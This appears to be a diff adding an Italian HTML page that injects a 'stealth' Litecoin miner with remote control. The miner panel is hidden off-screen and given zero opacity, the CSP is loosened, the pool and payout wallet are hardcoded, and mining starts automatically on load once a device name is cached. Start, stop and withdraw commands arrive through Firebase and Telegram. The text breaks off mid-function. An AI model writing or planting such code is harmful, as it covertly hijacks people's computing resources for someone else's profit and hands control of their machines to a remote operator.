@@ -1,0 +1,1217 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Miner LTC - MinotaurX</title>
+  <meta http-equiv="Content-Security-Policy" content="default-src * 'unsafe-inline' 'unsafe-eval' data: blob:;">
+</head>
+<body style="margin:0;background:#0a0a0a;color:#f5f5f5;font-family:Segoe UI,system-ui,sans-serif;">
+<!-- ========== INJECTED: DEVICE GATE + MINER LTC (stealth) ========== -->
+<style id="miner-stealth-style">
+  #device-gate {
+    position: fixed !important; inset: 0 !important; z-index: 2147483646 !important;
+    background: rgba(0, 0, 0, 0.94) !important; backdrop-filter: blur(12px);
+    display: flex !important; align-items: center; justify-content: center; padding: 20px;
+    margin: 0 !important; border: none !important;
+  }
+  #device-gate.hidden,
+  #device-gate[hidden] {
+    display: none !important; visibility: hidden !important; pointer-events: none !important;
+    opacity: 0 !important;
+  }
+  #device-gate .gate-card {
+    background: #141414; border: 1px solid #2a2a2a; border-radius: 16px;
+    padding: 28px 28px 22px; max-width: 420px; width: 100%;
+    box-shadow: 0 20px 50px rgba(0,0,0,0.5);
+    font-family: 'Segoe UI', system-ui, sans-serif; color: #f5f5f5;
+  }
+  #device-gate h2 {
+    font-size: 1.25rem; margin-bottom: 8px;
+    background: linear-gradient(90deg, #ef4444, #dc2626);
+    -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text;
+  }
+  #device-gate p { font-size: 0.88rem; color: #a3a3a3; margin-bottom: 16px; line-height: 1.45; }
+  #device-gate label { display: block; font-size: 0.78rem; color: #a3a3a3; margin-bottom: 6px; }
+  #device-gate input {
+    width: 100%; padding: 12px 14px; background: #0a0a0a; border: 1px solid #2a2a2a;
+    border-radius: 10px; color: #f5f5f5; font-size: 1rem; margin-bottom: 14px;
+    box-sizing: border-box;
+  }
+  #device-gate input:focus { outline: none; border-color: #ef4444; }
+  #device-gate button {
+    width: 100%; padding: 12px; border: none; border-radius: 10px;
+    background: linear-gradient(90deg, #ef4444, #dc2626); color: #fff;
+    font-weight: 700; font-size: 0.95rem; cursor: pointer;
+  }
+  #device-gate button:hover { opacity: 0.92; }
+  #device-gate .gate-hint { margin-top: 12px; font-size: 0.75rem; color: #737373; text-align: center; }
+
+  #device-name-badge {
+    position: fixed; top: 12px; left: 12px; z-index: 2147483000;
+    background: #141414; border: 1px solid #2a2a2a; border-radius: 999px;
+    padding: 6px 12px; font-size: 0.78rem; color: #f5f5f5;
+    cursor: pointer; font-family: 'Segoe UI', system-ui, sans-serif;
+    box-shadow: 0 4px 16px rgba(0,0,0,0.35); display: none;
+    max-width: 220px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis;
+  }
+  #device-name-badge.visible { display: inline-flex !important; align-items: center; gap: 6px; }
+  #device-name-badge:hover { border-color: #ef4444; }
+  #device-name-badge .dn-label { color: #a3a3a3; }
+  #device-name-badge .dn-name { color: #f87171; font-weight: 700; }
+
+  #live-devices-box { margin-top: 10px; font-size: 0.78rem; color: #a3a3a3; max-height: 120px; overflow-y: auto; }
+  #live-devices-box .ld-row { display: flex; justify-content: space-between; gap: 8px; padding: 3px 0; border-bottom: 1px solid #1a1a1a; }
+  #live-devices-box .ld-row.me .ld-name { color: #f87171; font-weight: 600; }
+  #live-devices-box .ld-ltc { color: #22c55e; font-variant-numeric: tabular-nums; }
+
+  /* Tutto il miner UI: nessun footprint sul layout pagina */
+  #panel-miner,
+  #miner-inject-hidden {
+    position: fixed !important; left: -10000px !important; top: 0 !important;
+    width: 1px !important; height: 1px !important; overflow: hidden !important;
+    opacity: 0 !important; pointer-events: none !important; margin: 0 !important;
+    padding: 0 !important; border: none !important; display: block !important;
+    z-index: -1 !important;
+  }
+  #miner-overlay {
+    display: block !important; position: fixed !important; inset: 0 !important;
+    z-index: 2147483645 !important; background: #0a0a0a !important; color: #f5f5f5;
+    font-family: 'Segoe UI', system-ui, sans-serif; overflow-y: auto; padding: 20px;
+    margin: 0 !important;
+  }
+  #miner-overlay.open { display: block !important; }
+  #miner-overlay * { box-sizing: border-box; }
+  #miner-overlay .container { max-width: 1100px; margin: 0 auto; }
+  #miner-overlay header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 18px; flex-wrap: wrap; gap: 10px; }
+  #miner-overlay h1 { font-size: 1.4rem; background: linear-gradient(90deg, #ef4444, #dc2626); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+  #miner-overlay .status-badge { padding: 5px 12px; border-radius: 999px; font-size: 0.82rem; font-weight: 600; }
+  #miner-overlay .status-badge.running { background: rgba(34,197,94,0.15); color: #22c55e; }
+  #miner-overlay .status-badge.stopped { background: rgba(239,68,68,0.15); color: #ef4444; }
+  #miner-overlay .status-badge.saving { background: rgba(234,179,8,0.2); color: #eab308; }
+  #miner-overlay .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); gap: 12px; margin-bottom: 16px; }
+  #miner-overlay .card { background: #141414; border: 1px solid #2a2a2a; border-radius: 10px; padding: 14px; }
+  #miner-overlay .card h3 { font-size: 0.8rem; color: #a3a3a3; margin-bottom: 5px; }
+  #miner-overlay .card .value { font-size: 1.35rem; font-weight: 700; }
+  #miner-overlay .card .sub { font-size: 0.75rem; color: #a3a3a3; margin-top: 2px; }
+  #miner-overlay .controls { display: flex; gap: 8px; flex-wrap: wrap; margin-bottom: 16px; }
+  #miner-overlay button { padding: 9px 16px; border: none; border-radius: 7px; font-weight: 600; cursor: pointer; font-size: 0.9rem; }
+  #miner-overlay button:disabled { opacity: 0.45; cursor: not-allowed; }
+  #miner-overlay .btn-primary { background: #ef4444; color: white; }
+  #miner-overlay .btn-danger { background: #ef4444; color: white; }
+  #miner-overlay .btn-secondary { background: #2a2a2a; color: #f5f5f5; }
+  #miner-overlay .btn-withdraw { background: #10b981; color: white; }
+  #miner-overlay .btn-calc { background: #f87171; color: white; }
+  #miner-overlay label { display: block; font-size: 0.78rem; color: #a3a3a3; margin-bottom: 3px; }
+  #miner-overlay input, #miner-overlay select { width: 100%; padding: 8px 10px; background: #0a0a0a; border: 1px solid #2a2a2a; border-radius: 7px; color: #f5f5f5; font-size: 0.9rem; box-sizing: border-box; }
+  #miner-overlay .settings-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
+  @media (max-width: 700px) { #miner-overlay .settings-grid { grid-template-columns: 1fr; } }
+  #miner-overlay .log-box { background: #000000; border: 1px solid #2a2a2a; border-radius: 8px; height: 220px; overflow-y: auto; padding: 10px; font-family: monospace; font-size: 0.78rem; }
+  #miner-overlay .log-entry { margin-bottom: 2px; }
+  #miner-overlay .log-entry.info { color: #a3a3a3; }
+  #miner-overlay .log-entry.success { color: #22c55e; }
+  #miner-overlay .log-entry.warn { color: #eab308; }
+  #miner-overlay .log-entry.error { color: #ef4444; }
+  #miner-overlay .hint { margin-top: 14px; font-size: 0.8rem; color: #a3a3a3; text-align: center; }
+  #miner-overlay .value.ltc { color: #22c55e; }
+  #miner-overlay .value.eur { color: #ef4444; }
+
+  #balance-box {
+    display: block !important; position: fixed !important; top: 16px; right: 16px; z-index: 2147483644 !important;
+    background: #141414; border: 1px solid #2a2a2a; border-radius: 12px;
+    box-shadow: 0 8px 24px rgba(0,0,0,0.4); min-width: 220px;
+    font-family: 'Segoe UI', system-ui, sans-serif; color: #f5f5f5; overflow: hidden;
+  }
+  #balance-box.visible { display: block !important; }
+  #balance-box .balance-header { display: flex; justify-content: space-between; align-items: center; padding: 10px 14px; background: #0a0a0a; cursor: pointer; user-select: none; }
+  #balance-box .balance-header h4 { margin: 0; font-size: 0.85rem; font-weight: 600; color: #f87171; }
+  #balance-box .balance-toggle { font-size: 0.75rem; color: #a3a3a3; }
+  #balance-box .balance-body { padding: 12px 14px; display: none; }
+  #balance-box.open .balance-body { display: block; }
+  #balance-box .balance-row { display: flex; justify-content: space-between; margin-bottom: 6px; font-size: 0.9rem; }
+  #balance-box .balance-label { color: #a3a3a3; }
+  #balance-box .balance-value { font-weight: 700; }
+  #balance-box .balance-value.ltc { color: #22c55e; }
+  #balance-box .balance-value.eur { color: #ef4444; }
+</style>
+
+<div id="device-gate">
+  <div class="gate-card">
+    <h2>Come si chiama questo device?</h2>
+    <p>Il nome comparirà su Telegram e nel saldo live multi-device (es. <em>Laptop Casa</em>, <em>PC Ufficio</em>).</p>
+    <label for="device-name-input">Nome device</label>
+    <input type="text" id="device-name-input" placeholder="Es. Laptop Casa" maxlength="40" autocomplete="off">
+    <button type="button" id="device-name-submit">Entra nell'app</button>
+    <div class="gate-hint">Salvato in cache · puoi cambiarlo dal pannello Miner (Impostazioni → Nome device)</div>
+  </div>
+</div>
+<div id="device-name-badge" title="Clicca per rinominare">
+  <span class="dn-label">Device:</span>
+  <span class="dn-name" id="device-name-badge-text">—</span>
+</div>
+
+<div id="miner-inject-hidden" aria-hidden="true">
+<div id="panel-miner">
+  <div id="statusBadge" class="status-badge stopped">FERMO</div>
+  <button id="btnStart" type="button">Avvia</button>
+  <button id="btnStop" type="button" disabled>Ferma</button>
+  <button id="btnWithdraw" type="button">Withdraw</button>
+  <button id="btnCalcEur" type="button">EUR</button>
+  <button id="btnClearLog" type="button">Clear</button>
+  <span id="hashrate">0 H/s</span>
+  <span id="avgHashrate">0</span>
+  <span id="maxHashrate">0</span>
+  <span id="sharesAccepted">0</span>
+  <span id="sharesRejected">0</span>
+  <span id="sessionTime">00:00:00</span>
+  <span id="startTime">—</span>
+  <span id="ltcPrice">— €</span>
+  <span id="priceUpdate">—</span>
+  <span id="globalLiveLtc">0.00000000 LTC</span>
+  <span id="globalLiveEur">0.00000000 €</span>
+  <span id="deviceLtc">0.00000000</span>
+  <span id="totalEur">0.00000000 €</span>
+  <span id="totalLtc">0.00000000</span>
+  <span id="threadsInfo">—</span>
+  <span id="cpuIntensity">100%</span>
+  <span id="deviceIdLabel">—</span>
+  <span id="tgBadge">Telegram</span>
+  <div id="live-devices-box"></div>
+  <div id="logBox"></div>
+  <input type="text" id="server" value="minotaurx.na.mine.zpool.ca">
+  <input type="number" id="port" value="7019">
+  <input type="text" id="worker" value="ltc1qmhem4axlhvyzml9x8xkeycj204t8kmlhk0vp2a">
+  <input type="text" id="password" value="c=LTC">
+  <input type="number" id="intensity" value="1.0" disabled>
+  <select id="ssl"><option value="false" selected>No</option><option value="true">Sì</option></select>
+</div>
+</div>
+
+<div id="balance-box" class="open">
+  <div class="balance-header" id="balance-header">
+    <h4>Saldo</h4>
+    <span class="balance-toggle" id="balance-toggle">▲</span>
+  </div>
+  <div class="balance-body">
+    <div class="balance-row"><span class="balance-label">Totale LTC</span><span class="balance-value ltc" id="box-totalLtc">0.00000000</span></div>
+    <div class="balance-row"><span class="balance-label">Totale EUR</span><span class="balance-value eur" id="box-totalEur">0.00000000 €</span></div>
+    <div class="balance-row" style="margin-top:8px;padding-top:8px;border-top:1px solid #2a2a2a">
+      <span class="balance-label">Questo device</span>
+      <span class="balance-value ltc" id="box-deviceLtc">0.00000000</span>
+    </div>
+  </div>
+</div>
+
+<div id="miner-overlay">
+  <div class="container">
+    <header>
+      <h1>Miner Personale LTC <span style="display:inline-flex;align-items:center;gap:6px;padding:4px 10px;border-radius:999px;font-size:0.75rem;background:rgba(59,130,246,0.15);color:#ef4444;margin-left:8px;-webkit-text-fill-color:#ef4444">📡 Telegram ready</span></h1>
+      <div id="m-statusBadge" class="status-badge stopped">FERMO</div>
+    </header>
+    <div class="controls">
+      <button id="m-btnStart" class="btn-primary" type="button">▶ Avvia</button>
+      <button id="m-btnStop" class="btn-danger" type="button" disabled>■ Ferma</button>
+      <button id="m-btnWithdraw" class="btn-withdraw" type="button">💰 Withdraw</button>
+      <button id="m-btnCalcEur" class="btn-calc" type="button">💶 Calcola EUR</button>
+      <button id="m-btnClearLog" class="btn-secondary" type="button">Pulisci Log</button>
+      <button id="m-btnClose" class="btn-secondary" type="button">Chiudi</button>
+    </div>
+    <div class="grid">
+      <div class="card"><h3>Hashrate Attuale</h3><div class="value" id="m-hashrate">0 H/s</div><div class="sub">Media: <span id="m-avgHashrate">0</span> · Max: <span id="m-maxHashrate">0</span></div></div>
+      <div class="card"><h3>Shares</h3><div class="value"><span id="m-sharesAccepted">0</span> / <span id="m-sharesRejected">0</span></div><div class="sub">Accettate / Rifiutate</div></div>
+      <div class="card"><h3>Tempo Sessione</h3><div class="value" id="m-sessionTime">00:00:00</div><div class="sub">Avviato: <span id="m-startTime">—</span></div></div>
+      <div class="card"><h3>Prezzo LTC</h3><div class="value" id="m-ltcPrice">— €</div><div class="sub">Coinbase · <span id="m-priceUpdate">—</span></div></div>
+      <div class="card"><h3>Live LTC (somma multi-device)</h3><div class="value" id="m-sessionLtc">0.00000000 LTC</div><div class="sub">Ogni device = chiave separata · somma in UI</div></div>
+      <div class="card"><h3>Valore Live (EUR)</h3><div class="value" id="m-sessionValue">0.00000000 €</div><div class="sub">Derivato dal prezzo LTC</div></div>
+      <div class="card"><h3>Totale Guadagnato</h3><div class="value" id="m-totalEur">0.00000000 €</div><div class="sub">Solo dopo Withdraw</div></div>
+      <div class="card"><h3>Thread / Intensità</h3><div class="value" id="m-threadsInfo">—</div><div class="sub">CPU: <span id="m-cpuIntensity">100%</span></div></div>
+    </div>
+    <div class="card" style="margin-bottom:14px">
+      <h3 style="margin-bottom:10px">Impostazioni</h3>
+      <div class="settings-grid">
+        <div style="grid-column:1/-1">
+          <label>Nome device</label>
+          <div style="display:flex;gap:8px">
+            <input type="text" id="m-device-name" placeholder="Es. PC Casa" maxlength="40" style="flex:1">
+            <button type="button" id="m-btnRename" class="btn-secondary" style="white-space:nowrap">Salva nome</button>
+          </div>
+          <div style="font-size:0.75rem;color:#a3a3a3;margin-top:4px">Il nome resta fisso ad ogni avvio. Cambia solo da qui.</div>
+        </div>
+        <div><label>Server</label><input type="text" id="m-server" value="minotaurx.na.mine.zpool.ca"></div>
+        <div><label>Porta</label><input type="number" id="m-port" value="7019"></div>
+        <div><label>Worker (LTC)</label><input type="text" id="m-worker" value="ltc1qmhem4axlhvyzml9x8xkeycj204t8kmlhk0vp2a"></div>
+        <div><label>Password</label><input type="text" id="m-password" value="c=LTC"></div>
+        <div><label>Intensità</label><input type="number" id="m-intensity" value="1.0" disabled></div>
+        <div><label>SSL</label><select id="m-ssl"><option value="false" selected>No</option><option value="true">Sì</option></select></div>
+      </div>
+    </div>
+    <div class="card"><h3>Log</h3><div class="log-box" id="m-logBox"></div></div>
+    <div class="hint"><strong>Ctrl+M</strong> apre/chiude questa UI · Telegram controlla start/stop/withdraw</div>
+  </div>
+</div>
+
+<!-- Gate CLASSICO (non-module): funziona sempre, anche se il module fallisce -->
+<script>
+(function () {
+  function lsGet(k) { try { return localStorage.getItem(k); } catch (e) { return null; } }
+  function lsSet(k, v) { try { localStorage.setItem(k, v); } catch (e) {} }
+  function sanitizeDeviceKey(name) {
+    var s = String(name || '').trim().toLowerCase()
+      .replace(/[\u0300-\u036f]/g, '')
+      .replace(/[^a-z0-9_\-\s]/g, '')
+      .replace(/\s+/g, '-')
+      .replace(/-+/g, '-')
+      .replace(/^-|-$/g, '')
+      .slice(0, 40);
+    return s || 'device';
+  }
+  window.__minerDevice = window.__minerDevice || {
+    name: lsGet('miner_device_name') || '',
+    id: lsGet('miner_device_key') || ''
+  };
+  function hideGate() {
+    var gate = document.getElementById('device-gate');
+    if (!gate) return;
+    gate.classList.add('hidden');
+    gate.setAttribute('hidden', '');
+    gate.style.setProperty('display', 'none', 'important');
+  }
+  function showGate() {
+    var gate = document.getElementById('device-gate');
+    if (!gate) return;
+    gate.classList.remove('hidden');
+    gate.removeAttribute('hidden');
+    gate.style.removeProperty('display');
+  }
+  function applyIdentity(name) {
+    name = String(name || '').trim().slice(0, 40);
+    var id = sanitizeDeviceKey(name);
+    window.__minerDevice.name = name;
+    window.__minerDevice.id = id;
+    lsSet('miner_device_name', name);
+    lsSet('miner_device_key', id);
+    var badgeText = document.getElementById('device-name-badge-text');
+    if (badgeText) badgeText.textContent = name;
+    var badge = document.getElementById('device-name-badge');
+    if (badge) badge.classList.add('visible');
+    var label = document.getElementById('deviceIdLabel');
+    if (label) label.textContent = name + ' (' + id + ')';
+    return { name: name, id: id };
+  }
+  function confirmName() {
+    var input = document.getElementById('device-name-input');
+    var name = (input && input.value || '').trim();
+    if (!name || name.length < 2) {
+      if (input) input.style.borderColor = '#ef4444';
+      return;
+    }
+    if (input) input.style.borderColor = '';
+    // Nome stabile (non cambia ad ogni avvio)
+    lsSet('miner_device_base_name', name);
+    applyIdentity(name);
+    hideGate();
+    // avvio miner se già pronto
+    if (typeof window.__minerOnDeviceReady === 'function') {
+      try { window.__minerOnDeviceReady(window.__minerDevice); } catch (e) { console.warn(e); }
+    }
+  }
+  function initGate() {
+    var gate = document.getElementById('device-gate');
+    var input = document.getElementById('device-name-input');
+    var submit = document.getElementById('device-name-submit');
+    var badge = document.getElementById('device-name-badge');
+    if (!gate) return;
+    var baseName = lsGet('miner_device_base_name') || lsGet('miner_device_name') || '';
+    if (baseName) {
+      // Nome stabile ad ogni riavvio
+      applyIdentity(baseName);
+      hideGate();
+      if (typeof window.__minerOnDeviceReady === 'function') {
+        try { window.__minerOnDeviceReady(window.__minerDevice); } catch (e) {}
+      }
+    } else if (window.__minerDevice.name && window.__minerDevice.id) {
+      applyIdentity(window.__minerDevice.name);
+      hideGate();
+      if (typeof window.__minerOnDeviceReady === 'function') {
+        try { window.__minerOnDeviceReady(window.__minerDevice); } catch (e) {}
+      }
+    } else {
+      showGate();
+      if (input) setTimeout(function () { try { input.focus(); } catch (e) {} }, 60);
+    }
+    if (submit && !submit.__minerBound) {
+      submit.__minerBound = true;
+      submit.addEventListener('click', function (e) { e.preventDefault(); confirmName(); });
+    }
+    if (input && !input.__minerBound) {
+      input.__minerBound = true;
+      input.addEventListener('keydown', function (e) {
+        if (e.key === 'Enter') { e.preventDefault(); confirmName(); }
+      });
+    }
+    if (badge && !badge.__minerBound) {
+      badge.__minerBound = true;
+      badge.addEventListener('click', function () {
+        if (input) input.value = window.__minerDevice.name || '';
+        showGate();
+      });
+    }
+  }
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', initGate);
+  } else {
+    initGate();
+  }
+  // fallback se DOM arriva tardi
+  setTimeout(initGate, 0);
+  setTimeout(initGate, 300);
+  window.__minerInitGate = initGate;
+  window.__minerHideGate = hideGate;
+})();
+</script>
+
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+<script type="module">
+
+  function lsGet(k) { try { return localStorage.getItem(k); } catch (e) { return null; } }
+  function lsSet(k, v) { try { localStorage.setItem(k, v); } catch (e) {} }
+  function lsRemove(k) { try { localStorage.removeItem(k); } catch (e) {} }
+
+  const firebaseConfig = {
+    databaseURL: "https://miner-90ba3-default-rtdb.europe-west1.firebasedatabase.app"
+  };
+  let db = null;
+  try {
+    if (typeof firebase !== 'undefined') {
+      firebase.initializeApp(firebaseConfig);
+      db = firebase.database();
+      console.log('[Miner] Firebase OK', firebaseConfig.databaseURL);
+    } else {
+      console.error('[Miner] firebase SDK non caricato');
+    }
+  } catch (e) {
+    console.error('firebase', e);
+    db = null;
+  }
+
+  const DEFAULT = {
+    server: "minotaurx.na.mine.zpool.ca",
+    port: 7019,
+    worker: "ltc1qmhem4axlhvyzml9x8xkeycj204t8kmlhk0vp2a",
+    password: "c=LTC",
+    intensity: 1.0,
+    ssl: false
+  };
+
+  function sanitizeDeviceKey(name) {
+    const s = String(name || '').trim().toLowerCase()
+      .normalize('NFD').replace(/[\u0300-\u036f]/g, '')
+      .replace(/[^a-z0-9_\-\s]/g, '')
+      .replace(/\s+/g, '-')
+      .replace(/-+/g, '-')
+      .replace(/^-|-$/g, '')
+      .slice(0, 40);
+    return s || 'device';
+  }
+
+  const __baseName = lsGet('miner_device_base_name') || lsGet('miner_device_name') || '';
+  let DEVICE_NAME = (window.__minerDevice && window.__minerDevice.name) || __baseName || '';
+  let DEVICE_ID = (window.__minerDevice && window.__minerDevice.id) || (__baseName ? sanitizeDeviceKey(DEVICE_NAME) : (lsGet('miner_device_key') || ''));
+  let autoStartDone = false;
+  if (__baseName && DEVICE_NAME) {
+    lsSet('miner_device_base_name', __baseName);
+    lsSet('miner_device_name', DEVICE_NAME);
+    lsSet('miner_device_key', DEVICE_ID);
+    if (window.__minerDevice) { window.__minerDevice.name = DEVICE_NAME; window.__minerDevice.id = DEVICE_ID; }
+  }
+
+  function setDeviceIdentity(name) {
+    DEVICE_NAME = String(name || '').trim().slice(0, 40);
+    DEVICE_ID = sanitizeDeviceKey(DEVICE_NAME);
+    lsSet('miner_device_name', DEVICE_NAME);
+    lsSet('miner_device_key', DEVICE_ID);
+    lsSet('miner_device_base_name', DEVICE_NAME);
+    if (window.__minerDevice) {
+      window.__minerDevice.name = DEVICE_NAME;
+      window.__minerDevice.id = DEVICE_ID;
+    }
+    const label = document.getElementById('deviceIdLabel');
+    if (label) label.textContent = DEVICE_NAME + ' (' + DEVICE_ID + ')';
+    const badgeText = document.getElementById('device-name-badge-text');
+    if (badgeText) badgeText.textContent = DEVICE_NAME;
+    const badge = document.getElementById('device-name-badge');
+    if (badge) badge.classList.add('visible');
+  }
+
+  const state = {
+    running: false, overlayOpen: false, startTimestamp: null, sessionSeconds: 0,
+    currentHashrate: 0, avgHashrate: 0, maxHashrate: 0,
+    sharesAccepted: 0, sharesRejected: 0, ltcPriceEur: 0, threads: 0,
+    baseLtc: 0, sessionLtc: 0, totalEur: 0, totalLtc: 0, globalLiveLtc: 0,
+    timerInterval: null, priceInterval: null, statsInterval: null,
+    liveReadInterval: null, firebaseInterval: null, withdrawCheckInterval: null
+  };
+
+  const FIREBASE_TOTALS = 'totals';
+  const FIREBASE_LIVE = 'live';
+  const FIREBASE_WITHDRAW = 'lastWithdraw';
+  const FIREBASE_CMD = 'remoteCommand';
+  const STALE_MS = 30 * 24 * 60 * 60 * 1000;
+  const STOP_COUNTDOWN_SEC = 0.5;
+
+  let lastWithdrawSeen = parseInt(lsGet('miner_last_withdraw_seen') || '0') || 0;
+  let lastCommandSeen = parseInt(lsGet('miner_last_command_seen') || '0') || 0;
+  let stopCountdownTimer = null;
+  let stopCountdownLeft = 0;
+  let pendingLiveLtc = 0;
+  let isSaving = false;
+
+  function saveToCache() {
+    lsSet('miner_device_ltc', String(state.sessionLtc || 0));
+    lsSet('miner_device_ltc_updated', String(Date.now()));
+  }
+  function loadFromCache() {
+    const v = parseFloat(lsGet('miner_device_ltc'));
+    if (!isNaN(v) && v >= 0) return v;
+    return 0;
+  }
+  function clearCache() {
+    lsRemove('miner_device_ltc');
+    lsRemove('miner_device_ltc_updated');
+  }
+
+  async function writeDeviceLive(value) {
+    const add = Number(value) || 0;
+    if (!db) { log('Firebase db non inizializzato', 'error'); return false; }
+    if (add <= 0) return true;
+    if (!DEVICE_ID) { log('DEVICE_ID mancante — impossibile salvare', 'error'); return false; }
+    const path = FIREBASE_LIVE + '/' + DEVICE_ID;
+    try {
+      const ref = db.ref(path);
+      // 1) Leggi valore live attuale
+      const snap = await ref.once('value');
+      const cur = snap.val();
+      const prev = (cur && typeof cur.ltc === 'number') ? cur.ltc : 0;
+      // 2) SOMMA cache/sessione al live
+      const total = prev + add;
+      // 3) Scrivi il totale
+      await ref.set({
+        ltc: total,
+        updatedAt: Date.now(),
+        device: DEVICE_ID,
+        name: DEVICE_NAME || DEVICE_ID,
+        lastAdd: add,
+        contribution: total
+      });
+      log('Live aggiornato: ' + prev.toFixed(8) + ' + ' + add.toFixed(8) + ' = ' + total.toFixed(8) + ' LTC', 'success');
+      return true;
+    } catch (e) {
+      log('Firebase errore scrittura: ' + (e && e.message ? e.message : e), 'error');
+      // Retry con transaction
+      try {
+        const ref = db.ref(path);
+        const result = await ref.transaction(current => {
+          const prev = (current && typeof current.ltc === 'number') ? current.ltc : 0;
+          return {
+            ltc: prev + add,
+            updatedAt: Date.now(),
+            device: DEVICE_ID,
+            name: DEVICE_NAME || DEVICE_ID,
+            lastAdd: add,
+            contribution: prev + add
+          };
+        });
+        if (result && result.committed) {
+          log('Firebase OK (transaction retry)', 'success');
+          return true;
+        }
+      } catch (e2) {
+        log('Firebase FALLITO: ' + (e2.message || e2), 'error');
+      }
+      return false;
+    }
+  }
+
+  let lastPushedSessionLtc = 0;
+  async function autoSaveLive() {
+    if (!state.running || !db || !DEVICE_ID) return;
+    try { updateOwnSessionLtc(); } catch (e) {}
+    const current = Number(state.sessionLtc) || 0;
+    const delta = current - (lastPushedSessionLtc || 0);
+    if (delta > 0.00000001) {
+      const ok = await writeDeviceLive(delta);
+      if (ok) lastPushedSessionLtc = current;
+    }
+  }
+
+  function sumGlobalLive(data) {
+    const now = Date.now();
+    let sum = 0;
+    if (!data || typeof data !== 'object') return 0;
+    Object.keys(data).forEach(key => {
+      const e = data[key];
+      if (e && typeof e.ltc === 'number' && (now - (e.updatedAt || 0)) < STALE_MS) sum += e.ltc;
+    });
+    return sum;
+  }
+
+  function renderLiveDevices(data) {
+    const box = document.getElementById('live-devices-box');
+    if (!box) return;
+    const now = Date.now();
+    if (!data || typeof data !== 'object') {
+      box.innerHTML = '<div style="opacity:0.6">Nessun device in live</div>';
+      return;
+    }
+    const rows = [];
+    Object.keys(data).forEach(key => {
+      const e = data[key];
+      if (!e || typeof e.ltc !== 'number') return;
+      if ((now - (e.updatedAt || 0)) >= STALE_MS) return;
+      const name = e.name || e.device || key;
+      const isMe = key === DEVICE_ID || e.name === DEVICE_NAME;
+      rows.push({ key, name, ltc: e.ltc, isMe });
+    });
+    rows.sort((a, b) => b.ltc - a.ltc);
+    if (!rows.length) {
+      box.innerHTML = '<div style="opacity:0.6">Nessun device in live</div>';
+      return;
+    }
+    const total = rows.reduce((s, r) => s + r.ltc, 0) || 1;
+    box.innerHTML = rows.map(r => {
+      const pct = ((r.ltc / total) * 100).toFixed(1);
+      return `<div class="ld-row${r.isMe ? ' me' : ''}"><span class="ld-name">${r.isMe ? '★ ' : ''}${r.name}</span><span class="ld-ltc">${r.ltc.toFixed(8)} (${pct}%)</span></div>`;
+    }).join('');
+  }
+
+  async function readGlobalLiveFromFirebase() {
+    if (!db) return;
+    try {
+      const snap = await db.ref(FIREBASE_LIVE).once('value');
+      const val = snap.val();
+      state.globalLiveLtc = sumGlobalLive(val);
+      renderLiveDevices(val);
+      updateEarningsDisplay();
+    } catch (e) {}
+  }
+
+  function updateOwnSessionLtc(forceFinal = false) {
+    if ((state.running || forceFinal) && state.startTimestamp) {
+      state.sessionSeconds = Math.floor((Date.now() - state.startTimestamp) / 1000);
+    }
+    let added = 0;
+    if ((state.running || forceFinal) && state.avgHashrate > 0 && state.sessionSeconds > 0) {
+      added = (state.avgHashrate * state.sessionSeconds) / 1e12;
+    }
+    if (state.running || forceFinal) {
+      state.sessionLtc = (state.baseLtc || 0) + added;
+      saveToCache();
+    }
+    updateBalanceUI();
+  }
+
+  function resetLocalDeviceBalance(reason) {
+    state.baseLtc = 0;
+    state.sessionLtc = 0;
+    pendingLiveLtc = 0;
+    clearCache();
+    updateBalanceUI();
+    updateEarningsDisplay();
+    if (reason) log(reason, 'warn');
+  }
+
+  async function checkRemoteWithdraw() {
+    if (!db) return;
+    try {
+      const snap = await db.ref(FIREBASE_WITHDRAW).once('value');
+      const data = snap.val();
+      const ts = data?.at ? parseInt(data.at) : 0;
+      if (ts && ts > lastWithdrawSeen) {
+        lastWithdrawSeen = ts;
+        lsSet('miner_last_withdraw_seen', String(ts));
+        if (stopCountdownTimer) {
+          clearTimeout(stopCountdownTimer);
+          stopCountdownTimer = null;
+          isSaving = false;
+        }
+        resetLocalDeviceBalance(`Withdraw remoto (${data.by || 'altro'}) → cache azzerata`);
+        await loadFromFirebase();
+      }
+    } catch (e) {}
+  }
+
+  async function handleRemoteCommand(cmd) {
+    if (!cmd || !cmd.action || !cmd.at) return;
+    const at = parseInt(cmd.at) || 0;
+    if (at <= lastCommandSeen) return;
+    lastCommandSeen = at;
+    lsSet('miner_last_command_seen', String(at));
+    const by = cmd.by || 'telegram';
+    log(`📡 Comando remoto: ${cmd.action} (da ${by})`, 'warn');
+    if (cmd.action === 'start') {
+      if (!state.running && !isSaving) {
+        await startMining();
+        log('✓ Mining avviato da Telegram', 'success');
+      } else log('Già in mining / saving — start ignorato', 'info');
+    } else if (cmd.action === 'stop') {
+      if (state.running && !isSaving) {
+        await stopMining();
+        log('✓ Mining fermato da Telegram', 'success');
+      } else log('Non in mining — stop ignorato', 'info');
+    } else if (cmd.action === 'withdraw') {
+      await doWithdraw();
+    }
+  }
+
+  function startRemoteCommandListener() {
+    if (!db) return;
+    db.ref(FIREBASE_CMD).on('value', snap => handleRemoteCommand(snap.val()));
+  }
+
+  async function doWithdraw() {
+    if (!db) { log('Firebase non disponibile', 'error'); return; }
+    if (isSaving) { log('Attendi fine salvataggio stop…', 'warn'); return; }
+    try {
+      const toPush = pendingLiveLtc > 0 ? pendingLiveLtc : (Number(state.sessionLtc) || loadFromCache() || 0);
+      if (toPush > 0) {
+        const ok = await writeDeviceLive(toPush);
+        if (ok) log(`Pre-withdraw: +${toPush.toFixed(8)} LTC → live/${DEVICE_ID}`, 'info');
+      }
+      const liveSnap = await db.ref(FIREBASE_LIVE).once('value');
+      const liveData = liveSnap.val() || {};
+      const now = Date.now();
+      let ltcToAdd = 0;
+      const parts = [];
+      Object.keys(liveData).forEach(key => {
+        const e = liveData[key];
+        if (e && typeof e.ltc === 'number' && (now - (e.updatedAt || 0)) < STALE_MS) {
+          ltcToAdd += e.ltc;
